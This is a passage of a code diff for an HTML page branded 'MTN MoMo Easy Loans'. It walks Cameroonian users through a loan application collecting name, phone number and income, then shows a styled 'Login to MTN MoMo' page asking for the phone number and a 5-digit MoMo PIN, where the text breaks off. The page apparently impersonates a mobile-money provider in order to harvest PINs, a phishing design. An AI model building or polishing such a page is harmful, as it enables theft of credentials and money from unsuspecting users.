@@ -65,416 +65,470 @@
     .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
     .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
     .field textarea { resize:vertical; min-height:90px; }
-    .sel-wrap { position:relative; }
-    .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
     .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
     .phone-row { display:flex; }
-   /* ─── NEW: Welcome + Loan Application pages ───────────── */
 
-  /* Welcome page */
-  .welcome-wrap { max-width: 440px; margin: 24px auto; padding: 0 16px; }
-  .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
-  .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
-  .welcome-sub { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 22px; }
-  .loan-calc { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 22px; }
-  .loan-calc-title { font-size: 1rem; font-weight: 600; color: #1C2340; margin-bottom: 14px; }
-  .loan-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.9rem; }
-  .loan-row .label { color: #555; }
-  .loan-row .val { color: #FFB300; font-weight: 600; }
-  .slider-wrap { margin: 16px 0 6px; }
-  .slider { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; appearance: none; -webkit-appearance: none; outline: none; }
-  .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
-  .slider::-moz-range-thumb { width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; }
-  .slider-limits { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; }
-  .monthly-box { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
-  .monthly-box .lbl { font-size: 0.9rem; color: #555; }
-  .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }
+    /* ─── NEW: Welcome + Loan Application pages ───────────── */
+    .welcome-wrap { max-width: 440px; margin: 24px auto; padding: 0 16px; }
+    .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
+    .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
+    .welcome-sub { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 22px; }
+    .loan-calc { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 22px; }
+    .loan-calc-title { font-size: 1rem; font-weight: 600; color: #1C2340; margin-bottom: 14px; }
+    .loan-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.9rem; }
+    .loan-row .label { color: #555; }
+    .loan-row .val { color: #FFB300; font-weight: 600; }
+    .slider-wrap { margin: 16px 0 6px; }
+    .slider { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; appearance: none; -webkit-appearance: none; outline: none; }
+    .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+    .slider::-moz-range-thumb { width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; }
+    .slider-limits { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; }
+    .monthly-box { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
+    .monthly-box .lbl { font-size: 0.9rem; color: #555; }
+    .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }
 
-  /* Progress bar */
-  .progress-wrap { max-width: 440px; margin: 0 auto 16px; padding: 0 16px; }
-  .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 24px 0 4px; }
-  .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
-  .progress-bar { display: flex; gap: 6px; }
-  .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
-  .progress-seg.active { background: #FFD700; }
+    .progress-wrap { max-width: 440px; margin: 0 auto 16px; padding: 0 16px; }
+    .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 24px 0 4px; }
+    .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
+    .progress-bar { display: flex; gap: 6px; }
+    .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
+    .progress-seg.active { background: #FFD700; }
 
-  /* Form fields for new pages */
-  .form-wrap { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
-  .form-card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
-  .form-field { margin-bottom: 18px; }
-  .form-field label { display: block; font-size: 0.85rem; font-weight: 500; color: #333; margin-bottom: 6px; }
-  .form-field input, .form-field select, .form-field textarea { width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #1C2340; background: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; appearance: none; -webkit-appearance: none; }
-  .form-field input:focus, .form-field select:focus, .form-field textarea:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
-  .form-field textarea { resize: vertical; min-height: 90px; }
-  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-  .form-hint { font-size: 0.75rem; color: #888; margin-top: 4px; }
-  .phone-prefix { display: flex; }
-  .phone-prefix .prefix { padding: 12px 14px; background: #f5f5f5; border: 1.5px solid #ddd; border-right: none; border-radius: 8px 0 0 8px; font-size: 0.92rem; color: #555; white-space: nowrap; }
-  .phone-prefix input { border-radius: 0 8px 8px 0; }
-  .form-actions { display: flex; gap: 12px; margin-top: 22px; }
-  .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
-  .btn-primary:hover { opacity: 0.92; }
-  .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-  .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
-  .btn-outline:hover { background: #d0d0d0; }
+    .form-wrap { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
+    .form-card { background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
+    .form-field { margin-bottom: 18px; }
+    .form-field label { display: block; font-size: 0.85rem; font-weight: 500; color: #333; margin-bottom: 6px; }
 
-  /* Summary box */
-  .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
-  .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
-  .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
-  .summary-row .val { font-weight: 600; color: #1C2340; } 
+    /* NEW: show a visible arrow on all selects */
+    .form-field select {
+      width: 100%; padding: 12px 40px 12px 14px;
+      border: 1.5px solid #ddd; border-radius: 8px;
+      font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #1C2340;
+      background-color: #fff;
+      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'><path fill='none' stroke='%23666' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' d='M1 1l5 5 5-5'/></svg>");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
+      appearance: none; -webkit-appearance: none;
+      cursor: pointer;
+    }
+    .form-field input, .form-field textarea { width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #1C2340; background: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+    .form-field input:focus, .form-field select:focus, .form-field textarea:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
+    .form-field textarea { resize: vertical; min-height: 90px; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .form-hint { font-size: 0.75rem; color: #888; margin-top: 4px; }
+    .phone-prefix { display: flex; }
+    .phone-prefix .prefix { padding: 12px 14px; background: #f5f5f5; border: 1.5px solid #ddd; border-right: none; border-radius: 8px 0 0 8px; font-size: 0.92rem; color: #555; white-space: nowrap; }
+    .phone-prefix input { border-radius: 0 8px 8px 0; }
+    .form-actions { display: flex; gap: 12px; margin-top: 22px; }
+    .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
+    .btn-primary:hover { opacity: 0.92; }
+    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+    .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
+    .btn-outline:hover { background: #d0d0d0; }
+
+    .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
+    .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
+    .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
+    .summary-row .val { font-weight: 600; color: #1C2340; }
+
+    /* ─── Login V2 (matches target design) ──────────── */
+    .lv2-page { background: #F5F5F5; min-height: 100vh; display: flex; flex-direction: column; }
+    .lv2-header { background: #003366; padding: 30px 20px 50px; text-align: center; border-radius: 0 0 40px 40px; }
+    .lv2-logo-icon { width: 60px; height: 60px; background: #FFD700; border-radius: 10px; display: inline-flex; align-items: center; justify-content: center; font-size: 2rem; font-weight: 900; color: #003366; margin: 0 auto 8px; }
+    .lv2-logo-icon::after { content: 'M'; }
+    .lv2-logo-title { font-size: 1.4rem; font-weight: 700; color: #FFD700; margin: 0; }
+    .lv2-logo-sub { font-size: 0.85rem; color: rgba(255,255,255,0.75); margin-top: 4px; }
+    .lv2-body { flex: 1; padding: 30px 20px; }
+    .lv2-title { text-align: center; font-size: 1.3rem; font-weight: 700; color: #1C2340; margin-bottom: 26px; }
+    .lv2-phone-box { background: #fff; border: 1.5px solid #ddd; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; margin-bottom: 20px; }
+    .lv2-phone-box .prefix { font-size: 0.95rem; color: #1C2340; font-weight: 600; margin-right: 10px; }
+    .lv2-phone-box input { flex: 1; border: none; outline: none; font-size: 0.95rem; font-family: 'Inter', sans-serif; color: #1C2340; background: transparent; }
+    .lv2-pin-label { text-align: center; font-size: 0.88rem; color: #444; margin-bottom: 14px; }
+    .lv2-pin-row { display: flex; justify-content: center; gap: 10px; align-items: center; margin-bottom: 12px; }
+    .lv2-pin-box { width: 44px; height: 48px; border: 1.5px solid #ddd; border-radius: 10px; text-align: center; font-size: 1.2rem; font-family: 'Inter', sans-serif; color: #1C2340; outline: none; background: #fff; }
+    .lv2-pin-box:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
+    .lv2-icons { display: flex; gap: 8px; margin-left: 8px; }
+    .lv2-icon-btn { background: none; border: none; color: #888; cursor: pointer; font-size: 1.1rem; padding: 4px; }
+    .lv2-login-btn { width: 100%; padding: 15px; background: #e0e0e0; color: #999; border: none; border-radius: 12px; font-family: 'Inter', sans-serif; font-size: 0.95rem; font-weight: 700; letter-spacing: 0.05em; cursor: not-allowed; margin-top: 20px; transition: all 0.2s; }
+    .lv2-login-btn.enabled { background: linear-gradient(to right, #003366, #004080); color: #fff; cursor: pointer; }
+    .lv2-login-btn.enabled:hover { opacity: 0.92; }
+    .lv2-footer { padding: 30px 20px 20px; text-align: center; background: #003366; }
+    .lv2-footer-logo { width: 40px; height: 40px; background: #FFD700; border-radius: 8px; display: inline-flex; align-items: center; justify-content: center; font-size: 1.4rem; font-weight: 900; color: #003366; margin-bottom: 6px; }
+    .lv2-footer-logo::after { content: 'M'; }
+    .lv2-footer-title { font-size: 0.9rem; font-weight: 700; color: #fff; margin: 0; }
+    .lv2-footer-copy { font-size: 0.72rem; color: rgba(255,255,255,0.7); margin-top: 6px; }
+
+    /* msg helper */
+    .msg { display: none; padding: 10px 14px; border-radius: 8px; font-size: 0.85rem; margin-bottom: 12px; }
+    .msg.show { display: block; }
+    .msg.ok    { background: #e6f7e6; color: #1a7a1a; }
+    .msg.warn  { background: #fff7e0; color: #a06a00; }
+    .msg:not(.ok):not(.warn) { background: #fde8e8; color: #b00020; }
   </style>
 </head>
-<body>
-  <!-- PAGE CONTAINER (simplified for brevity, full structure remains) -->
-  <div id="app">
-    <!-- ═══ NEW: Welcome page ═══ -->
-    <div id="page-welcome" class="page active">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+<body>  <!-- ═══ NEW: Welcome page ═══ -->
+  <div id="page-welcome" class="page active">
+    <div class="navbar">
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Easy Loans</div>
       </div>
+      <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </div>
 
-      <div class="welcome-wrap">
-        <div class="welcome-card">
-          <h1 class="welcome-title">Welcome to MTN MoMo</h1>
-          <p class="welcome-sub">Get loans easily through MTN MoMo</p>
+    <div class="welcome-wrap">
+      <div class="welcome-card">
+        <h1 class="welcome-title">Welcome to MTN MoMo</h1>
+        <p class="welcome-sub">Get loans easily through MTN MoMo</p>
 
-          <div class="loan-calc">
-            <div class="loan-calc-title">Loan Calculator</div>
-            <div class="loan-row">
-              <span class="label">Amount</span>
-              <span class="val" id="wAmount">XAF 1,000,000</span>
-            </div>
-            <div class="loan-row">
-              <span class="label">Term</span>
-              <span class="val" id="wTerm">48 Months</span>
-            </div>
+        <div class="loan-calc">
+          <div class="loan-calc-title">Loan Calculator</div>
+          <div class="loan-row">
+            <span class="label">Amount</span>
+            <span class="val" id="wAmount">XAF 1,000,000</span>
+          </div>
+          <div class="loan-row">
+            <span class="label">Term</span>
+            <span class="val" id="wTerm">48 Months</span>
+          </div>
 
-            <div class="slider-wrap">
-              <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
-              <div class="slider-limits">
-                <span>XAF 500,000</span>
-                <span>XAF 5,000,000</span>
-              </div>
-            </div>
-
-            <div class="monthly-box">
-              <span class="lbl">Monthly Payment</span>
-              <span class="amount" id="wMonthly">XAF 20,834</span>
+          <div class="slider-wrap">
+            <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
+            <div class="slider-limits">
+              <span>XAF 500,000</span>
+              <span>XAF 5,000,000</span>
             </div>
           </div>
 
-          <button class="btn-primary" style="width:100%;" onclick="startApplication()">START APPLICATION</button>
+          <div class="monthly-box">
+            <span class="lbl">Monthly Payment</span>
+            <span class="amount" id="wMonthly">XAF 20,834</span>
+          </div>
         </div>
+
+        <button class="btn-primary" style="width:100%;" onclick="startApplication()">START APPLICATION</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ Step 1 — Loan Details ═══ -->
+  <div id="page-step1" class="page">
+    <div class="navbar">
+      <a class="nav-left" onclick="goTo('page-welcome')">← Back</a>
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Loans</div>
+      </div>
+      <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </div>
+
+    <div class="progress-wrap">
+      <div class="progress-title">Loan Application</div>
+      <div class="progress-sub">Step 1 of 3</div>
+      <div class="progress-bar">
+        <div class="progress-seg active"></div>
+        <div class="progress-seg"></div>
+        <div class="progress-seg"></div>
       </div>
     </div>
 
-    <!-- ═══ NEW: Step 1 — Loan Details ═══ -->
-    <div id="page-step1" class="page">
-      <div class="navbar">
-        <a class="nav-left" onclick="goTo('page-welcome')">← Back</a>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
+    <div class="form-wrap">
+      <div class="form-card">
+        <div class="form-field">
+          <label>Loan Type</label>
+          <select id="fLoanType">
+            <option>Business Loan</option>
+            <option>Personal Loan</option>
+            <option>Emergency Loan</option>
+            <option>Education Loan</option>
+          </select>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
 
-      <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 1 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg"></div>
-          <div class="progress-seg"></div>
+        <div class="form-field">
+          <label>Loan Amount (XAF)</label>
+          <input type="number" id="fAmount" value="1000000" min="50000" max="5000000" step="10000">
         </div>
-      </div>
 
-      <div class="form-wrap">
-        <div class="form-card">
-          <div class="form-field">
-            <label>Loan Type</label>
-            <select id="fLoanType">
-              <option>Business Loan</option>
-              <option>Personal Loan</option>
-              <option>Emergency Loan</option>
-              <option>Education Loan</option>
-            </select>
+        <div class="form-field">
+          <label>Loan Term</label>
+          <input type="range" class="slider" id="fTermSlider" min="6" max="60" step="6" value="48" oninput="updateTermDisplay()">
+          <div class="slider-limits">
+            <span>6 Months</span>
+            <span>60 Months</span>
           </div>
+          <div class="monthly-box" style="margin-top:10px;">
+            <span class="lbl">Selected Term</span>
+            <span class="amount" id="fTermDisplay">48 Months</span>
+          </div>
+        </div>
 
-          <div class="form-field">
-            <label>Loan Amount (XAF)</label>
-            <input type="number" id="fAmount" value="1000000" min="50000" max="5000000" step="10000">
-          </div>
+        <div class="form-field">
+          <label>Purpose of Loan</label>
+          <textarea id="fPurpose" placeholder="Describe the purpose of your loan..."></textarea>
+        </div>
 
-          <div class="form-field">
-            <label>Loan Term</label>
-            <select id="fTerm">
-              <option>12 Months</option>
-              <option>24 Months</option>
-              <option>36 Months</option>
-              <option selected>48 Months</option>
-            </select>
-          </div>
-
-          <div class="form-field">
-            <label>Purpose of Loan</label>
-            <textarea id="fPurpose" placeholder="Describe the purpose of your loan..."></textarea>
-          </div>
-
-          <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-welcome')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep2()">NEXT STEP</button>
-          </div>
+        <div class="form-actions">
+          <button class="btn-outline" onclick="goTo('page-welcome')">BACK</button>
+          <button class="btn-primary" onclick="nextToStep2()">NEXT STEP</button>
         </div>
       </div>
     </div>
+  </div>
 
-    <!-- ═══ NEW: Step 2 — Personal Details ═══ -->
-    <div id="page-step2" class="page">
-      <div class="navbar">
-        <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  <!-- ═══ Step 2 — Personal Details ═══ -->
+  <div id="page-step2" class="page">
+    <div class="navbar">
+      <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Loans</div>
       </div>
+      <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </div>
 
-      <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 2 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
-          <div class="progress-seg"></div>
-        </div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card">
-          <div class="form-row">
-            <div class="form-field">
-              <label>First Name</label>
-              <input type="text" id="fFirst" placeholder="First Name">
-            </div>
-            <div class="form-field">
-              <label>Last Name</label>
-              <input type="text" id="fLast" placeholder="Last Name">
-            </div>
-          </div>
-
-          <div class="form-field">
-            <label>Phone Number (Cameroon)</label>
-            <div class="phone-prefix">
-              <span class="prefix">+237</span>
-              <input type="tel" id="fPhone" maxlength="9" placeholder="670123456">
-            </div>
-            <div class="form-hint">9 digits without +237 prefix (e.g., 670123456)</div>
-          </div>
-
-          <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-step1')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep3()">NEXT STEP</button>
-          </div>
-        </div>
+    <div class="progress-wrap">
+      <div class="progress-title">Loan Application</div>
+      <div class="progress-sub">Step 2 of 3</div>
+      <div class="progress-bar">
+        <div class="progress-seg active"></div>
+        <div class="progress-seg active"></div>
+        <div class="progress-seg"></div>
       </div>
     </div>
 
-    <!-- ═══ NEW: Step 3 — Employment + Summary ═══ -->
-    <div id="page-step3" class="page">
-      <div class="navbar">
-        <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
-        </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-      </div>
-
-      <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 3 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
-        </div>
-      </div>
-
-      <div class="form-wrap">
-        <div class="form-card">
+    <div class="form-wrap">
+      <div class="form-card">
+        <div class="form-row">
           <div class="form-field">
-            <label>Employment Status</label>
-            <select id="fEmp">
-              <option>Self-employed</option>
-              <option>Employed full-time</option>
-              <option>Employed part-time</option>
-              <option>Student</option>
-              <option>Unemployed</option>
-            </select>
+            <label>First Name</label>
+            <input type="text" id="fFirst" placeholder="First Name">
           </div>
-
           <div class="form-field">
-            <label>Annual Income (XAF)</label>
-            <input type="number" id="fIncome" placeholder="Enter annual income">
+            <label>Last Name</label>
+            <input type="text" id="fLast" placeholder="Last Name">
           </div>
+        </div>
 
-          <div class="summary-box">
-            <h4>Application Summary</h4>
-            <div class="summary-row">
-              <span>Loan Amount:</span>
-              <span class="val" id="sumAmount">XAF 1,000,000</span>
-            </div>
-            <div class="summary-row">
-              <span>Loan Term:</span>
-              <span class="val" id="sumTerm">48 Months</span>
-            </div>
-            <div class="summary-row">
-              <span>Purpose:</span>
-              <span class="val" id="sumPurpose">—</span>
-            </div>
-            <div class="summary-row">
-              <span>Applicant:</span>
-              <span class="val" id="sumApplicant">—</span>
-            </div>
+        <div class="form-field">
+          <label>Phone Number (Cameroon)</label>
+          <div class="phone-prefix">
+            <span class="prefix">+237</span>
+            <input type="tel" id="fPhone" maxlength="9" placeholder="670123456">
           </div>
+          <div class="form-hint">9 digits without +237 prefix (e.g., 670123456)</div>
+        </div>
 
-          <div class="form-actions">
-            <button class="btn-outline" onclick="goTo('page-step2')">BACK</button>
-            <button class="btn-primary" id="submitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
-          </div>
+        <div class="form-actions">
+          <button class="btn-outline" onclick="goTo('page-step1')">BACK</button>
+          <button class="btn-primary" onclick="nextToStep3()">NEXT STEP</button>
         </div>
       </div>
     </div>
-    
-        <!-- ═══ NEW: Processing page (after Step 3 submit) ═══ -->
-    <div id="page-processing" class="page">
-      <div style="min-height: 100vh; background: #003366; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; color: #fff;">
-        <div style="width: 110px; height: 110px; border-radius: 50%; background: rgba(255,255,255,0.08); display: flex; align-items: center; justify-content: center; margin-bottom: 28px;">
-          <div style="width: 70px; height: 70px; border-radius: 50%; background: rgba(255,215,0,0.15); display: flex; align-items: center; justify-content: center; font-size: 2rem;">⏳</div>
-        </div>
-        <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 10px; color: #fff;">Processing Application...</h2>
-        <p style="font-size: 0.95rem; color: rgba(255,255,255,0.75); max-width: 340px; margin-bottom: 22px;">Please wait while we process your loan application</p>
-        <p style="font-size: 0.85rem; color: rgba(255,255,255,0.5);">Redirecting in <span id="countdown">5</span> seconds...</p>
+  </div>
+
+  <!-- ═══ Step 3 — Employment + Summary ═══ -->
+  <div id="page-step3" class="page">
+    <div class="navbar">
+      <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Loans</div>
+      </div>
+      <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+    </div>
+
+    <div class="progress-wrap">
+      <div class="progress-title">Loan Application</div>
+      <div class="progress-sub">Step 3 of 3</div>
+      <div class="progress-bar">
+        <div class="progress-seg active"></div>
+        <div class="progress-seg active"></div>
+        <div class="progress-seg active"></div>
       </div>
     </div>
 
-    <!-- Login page -->
-    <div id="page-login" class="page">
-      <div class="navbar">
-        <a class="nav-left" onclick="goTo('page-welcome')">← Back</a>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
+    <div class="form-wrap">
+      <div class="form-card">
+        <div class="form-field">
+          <label>Employment Status</label>
+          <select id="fEmp">
+            <option>Self-employed</option>
+            <option>Employed full-time</option>
+            <option>Employed part-time</option>
+            <option>Student</option>
+            <option>Unemployed</option>
+          </select>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+
+        <div class="form-field">
+          <label>Annual Income (XAF)</label>
+          <input type="number" id="fIncome" placeholder="Enter annual income">
+        </div>
+
+        <div class="summary-box">
+          <h4>Application Summary</h4>
+          <div class="summary-row">
+            <span>Loan Amount:</span>
+            <span class="val" id="sumAmount">XAF 1,000,000</span>
+          </div>
+          <div class="summary-row">
+            <span>Loan Term:</span>
+            <span class="val" id="sumTerm">48 Months</span>
+          </div>
+          <div class="summary-row">
+            <span>Purpose:</span>
+            <span class="val" id="sumPurpose">—</span>
+          </div>
+          <div class="summary-row">
+            <span>Applicant:</span>
+            <span class="val" id="sumApplicant">—</span>
+          </div>
+        </div>
+
+        <div class="form-actions">
+          <button class="btn-outline" onclick="goTo('page-step2')">BACK</button>
+          <button class="btn-primary" id="submitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+        </div>
       </div>
-      <div style="padding: 24px;">
+    </div>
+  </div>
+
+  <!-- ═══ Processing page ═══ -->
+  <div id="page-processing" class="page">
+    <div style="min-height: 100vh; background: #003366; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; color: #fff;">
+      <div style="width: 110px; height: 110px; border-radius: 50%; background: rgba(255,255,255,0.08); display: flex; align-items: center; justify-content: center; margin-bottom: 28px;">
+        <div style="width: 70px; height: 70px; border-radius: 50%; background: rgba(255,215,0,0.15); display: flex; align-items: center; justify-content: center; font-size: 2rem;">⏳</div>
+      </div>
+      <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 10px; color: #fff;">Processing Application...</h2>
+      <p style="font-size: 0.95rem; color: rgba(255,255,255,0.75); max-width: 340px; margin-bottom: 22px;">Please wait while we process your loan application</p>
+      <p style="font-size: 0.85rem; color: rgba(255,255,255,0.5);">Redirecting in <span id="countdown">5</span> seconds...</p>
+    </div>
+  </div>
+
+  <!-- ═══ Login page (V2 styled) ═══ -->
+  <div id="page-login" class="page">
+    <div class="lv2-page">
+      <div class="lv2-header">
+        <div class="lv2-logo-icon"></div>
+        <div class="lv2-logo-title">MoMo</div>
+        <div class="lv2-logo-sub">Login via MTN MoMo</div>
+      </div>
+
+      <div class="lv2-body">
+        <div class="lv2-title">Login to MTN MoMo</div>
+
+        <div class="lv2-phone-box">
+          <span class="prefix">+237</span>
+          <input type="tel" id="lpPhone" maxlength="9" placeholder="670123456" value="670123456">
+        </div>
+
+        <div class="lv2-pin-label">Enter your MoMo PIN (5 digits):</div>
+
+        <div class="lv2-pin-row">
+          <input id="lp0" class="lv2-pin-box" maxlength="1" inputmode="numeric" type="password">
